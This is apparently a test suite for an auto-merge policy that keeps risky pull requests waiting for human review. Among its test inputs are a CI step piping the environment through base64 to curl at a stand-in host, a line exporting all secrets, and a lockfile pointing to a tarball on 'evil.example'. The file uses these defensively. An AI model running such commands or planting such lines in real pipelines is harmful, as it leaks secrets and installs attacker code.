import assert from 'node:assert/strict';
import { test } from 'node:test';
import { decide, isMinorBumpPatch, isSafeWorkflowPatch } from '../../../../scripts/lib/autoMergePolicy.mjs';

const f = (filename, extra = {}) => ({ filename, status: 'modified', additions: 5, deletions: 2, patch: '', ...extra });

test('a bug fix that comes with a test may merge on its own', () => {
  const r = decide([f('apps/web/src/components/Calendar.jsx'), f('apps/web/tests/unit/calendar.test.js', { status: 'added' })]);
  assert.equal(r.allowed, true, r.reasons.join('; '));
  assert.deepEqual(r.kinds, ['bug fix with a test']);
});

test('a code change without a test waits', () => {
  const r = decide([f('packages/core/media.js')]);
  assert.equal(r.allowed, false);
  assert.match(r.reasons[0], /without a test/);
});

test('payments, the database, permissions and member data always wait, even with a test', () => {
  for (const path of [
    'supabase/migrations/20261111000000_x.sql',
    'supabase/functions/stripe-webhook/index.ts',
    'packages/core/billing.js',
    'packages/core/premiumCheckout.js',
    'supabase/functions/delete-account/index.ts',
    'packages/core/profileFields.js',
    'packages/core/authErrors.js',
    'supabase/config.toml',
  ]) {
    const r = decide([f(path), f('apps/web/tests/unit/x.test.js')]);
    assert.equal(r.allowed, false, path);
  }
});

test('legal pages, marketing content, env files and security headers wait', () => {
  for (const path of ['apps/website/terms.html', 'apps/website/privacy.html', 'marketing/copy/AGENT.md', '.env', 'functions/_middleware.js', 'apps/web/public/_headers']) {
    assert.equal(decide([f(path)]).allowed, false, path);
  }
});

test('the rules cannot loosen themselves', () => {
  assert.equal(decide([f('scripts/lib/autoMergePolicy.mjs'), f('apps/web/tests/unit/autoMergePolicy.test.js')]).allowed, false);
  assert.equal(decide([f('.github/workflows/auto-merge.yml')]).allowed, false);
});

test('a PR still carrying its handoff note waits', () => {
  assert.equal(decide([f('docs/ops/x.md'), f('AGENT_HANDOFF.md', { status: 'added' })]).allowed, false);
});

test('deleting a test or a guard waits', () => {
  assert.equal(decide([f('apps/web/src/a.js'), f('apps/web/tests/unit/a.test.js', { status: 'removed' })]).allowed, false);
  assert.equal(decide([f('scripts/check-block-clause.mjs')]).allowed, false);
  assert.equal(decide([f('scripts/staging-block-test.sql')]).allowed, false);
});

test('docs may merge on their own; shared copy is code and needs a test', () => {
  const r = decide([f('docs/ops/monitoring.md'), f('README.md')]);
  assert.equal(r.allowed, true, r.reasons.join('; '));
  assert.equal(decide([f('packages/core/copy/settingsView.js')]).allowed, false);
  assert.equal(decide([f('packages/core/copy/settingsView.js'), f('packages/core/tests/unit/copy.test.js')]).allowed, true);
});

test('security code with innocent names waits', () => {
  for (const path of ['supabase/functions/_shared/serviceKey.ts', 'supabase/functions/_shared/supabaseAdmin.ts', 'supabase/functions/_shared/securityGuards.js', 'supabase/functions/_shared/internalWebhook.ts', 'supabase/functions/export-user-data/index.ts', 'apps/website/functions/_middleware.js', 'apps/website/functions/_lib/csp.generated.js']) {
    assert.equal(decide([f(path), f('apps/web/tests/unit/x.test.js')]).allowed, false, path);
  }
});

test('a truncated file list waits', () => {
  assert.equal(decide([f('docs/a.md')], 2).allowed, false);
  assert.equal(decide([f('docs/a.md')], 1).allowed, true);
});

test('lockfile-only, odd version ranges and off-registry lockfile entries wait', () => {
  const minor = '-    "posthog-js": "^1.200.0",\n+    "posthog-js": "^1.210.3",';
  assert.equal(decide([f('pnpm-lock.yaml', { patch: '+      version: 1.2.3' })]).allowed, false);
  assert.equal(isMinorBumpPatch('-    "a": "^19.1.0",\n+    "a": "19.2.0 || >=20",'), false);
  assert.equal(isMinorBumpPatch('-    "a": "^1.0.0",\n+    "a": "1.0.1 || file:../x",'), false);
  assert.equal(decide([f('apps/web/package.json', { patch: minor }), f('pnpm-lock.yaml', { patch: '+    resolution: {tarball: https://evil.example/a.tgz}' })]).allowed, false);
  assert.equal(decide([f('apps/web/package.json', { patch: minor }), f('pnpm-lock.yaml', { patch: '+    resolution: {integrity: sha512-abc}' })]).allowed, true);
});

test('a workflow fix may merge only when it changes versions, runners, timeouts or schedules', () => {
  const pin = '-      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1\n+      - uses: actions/checkout@aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa # v7.0.2';
  assert.equal(decide([f('.github/workflows/netflix-top10.yml', { patch: '-    runs-on: ubuntu-22.04\n+    runs-on: ubuntu-latest' })]).allowed, true);
  assert.equal(decide([f('.github/workflows/netflix-top10.yml', { patch: pin })]).allowed, true);
  // The shapes a deny-list misses: a new step that ships the environment somewhere.
  assert.equal(isSafeWorkflowPatch('+      - run: env | base64 | curl -d @- https://x.example'), false);
  assert.equal(isSafeWorkflowPatch("+          KEY: ${{ toJSON(secrets) }}"), false);
  assert.equal(isSafeWorkflowPatch('+  contents: write\n+permissions:'), false);
  assert.equal(isSafeWorkflowPatch('+      - uses: someone/action@v1'), false);
  assert.equal(isSafeWorkflowPatch(''), false);
  assert.equal(decide([f('.github/workflows/new.yml', { status: 'added', patch: '+    runs-on: ubuntu-latest' })]).allowed, false);
  assert.equal(decide([f('.github/scripts/job-incident.sh')]).allowed, false);
  // The CI workflow gates both merge flows, so even a "safe" line waits:
  // continue-on-error would let it pass without checking anything.
  assert.equal(decide([f('.github/workflows/ci.yml', { patch: '+        continue-on-error: true' })]).allowed, false);
  assert.equal(decide([f('scripts/agent/ciTier.mjs')]).allowed, false);
  assert.equal(decide([f('scripts/ci-tier.mjs')]).allowed, false);
  assert.equal(decide([f('.github/workflows/dependabot-automerge.yml', { patch: '-    runs-on: ubuntu-22.04\n+    runs-on: ubuntu-latest' })]).allowed, false);
});

test('a rename is judged on both names, and renames or deletes of code wait', () => {
  assert.equal(decide([f('docs/notes.md', { status: 'renamed', previous_filename: 'supabase/migrations/20261111_x.sql' })]).allowed, false);
  assert.equal(decide([f('apps/web/src/b.js', { status: 'renamed', previous_filename: 'apps/web/src/a.js' }), f('apps/web/tests/unit/b.test.js')]).allowed, false);
  assert.equal(decide([f('apps/web/src/old.js', { status: 'removed' }), f('apps/web/tests/unit/x.test.js')]).allowed, false);
});

test('agent instructions and configuration always wait', () => {
  for (const path of ['AGENTS.md', 'CLAUDE.md', 'apps/mobile/AGENTS.md', '.claude/settings.json', '.agents/skills/plot-worktree/SKILL.md', '.cursor/environment.json', 'skills-lock.json', 'marketing/copy/GROK-HANDOFF.md']) {
    assert.equal(decide([f(path)]).allowed, false, path);
  }
});

test('library updates: same-major bumps only, and never mixed into a fix', () => {
  const minor = '-    "posthog-js": "^1.200.0",\n+    "posthog-js": "^1.210.3",';
  const major = '-    "react": "^19.1.0",\n+    "react": "^20.0.0",';
  const added = '+    "left-pad": "^1.3.0",';
  assert.equal(isMinorBumpPatch(minor), true);
  assert.equal(isMinorBumpPatch(major), false);
  assert.equal(isMinorBumpPatch(added), false);
  assert.equal(decide([f('apps/web/package.json', { patch: minor }), f('pnpm-lock.yaml', { patch: '+    version: 1.210.3' })]).allowed, true);
  assert.equal(decide([f('apps/web/package.json', { patch: major }), f('pnpm-lock.yaml')]).allowed, false);
  assert.equal(decide([f('apps/web/package.json', { patch: minor }), f('apps/web/src/a.js'), f('apps/web/tests/unit/a.test.js')]).allowed, false);
});

test('unknown kinds of file and very large fixes wait', () => {
  assert.equal(decide([f('apps/web/public/logo.svg')]).allowed, false);
  assert.equal(decide([f('docs/a.md', { additions: 500 })]).allowed, false);
  assert.equal(decide([]).allowed, false);
});
